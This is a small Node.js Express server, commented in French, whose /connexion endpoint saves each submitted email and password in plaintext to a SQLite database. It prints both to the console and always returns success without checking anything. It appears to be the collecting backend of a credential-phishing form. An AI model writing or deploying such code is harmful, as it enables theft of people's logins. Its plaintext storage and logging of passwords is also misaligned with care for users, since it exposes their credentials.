const express = require('express');
const Database = require('better-sqlite3');
const cors = require('cors');

const app = express();
const db = new Database('utilisateurs.db');

// Créer la table avec email + mot de passe + date
db.exec(`CREATE TABLE IF NOT EXISTS utilisateurs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT NOT NULL,
  mot_de_passe TEXT NOT NULL,
  date_connexion TEXT NOT NULL
)`);

app.use(cors());
app.use(express.json());

// Recevoir les données du formulaire
app.post('/connexion', (req, res) => {
  const { email, mot_de_passe } = req.body;
  const date = new Date().toLocaleString('fr-FR');

  const stmt = db.prepare('INSERT INTO utilisateurs (email, mot_de_passe, date_connexion) VALUES (?, ?, ?)');
  stmt.run(email, mot_de_passe, date);

  console.log(`✅ Enregistré : ${email} | ${mot_de_passe} | ${date}`);
  res.json({ succes: true });
});

app.listen(3000, () => {
  console.log('✅ Serveur démarré sur http://localhost:3000');
});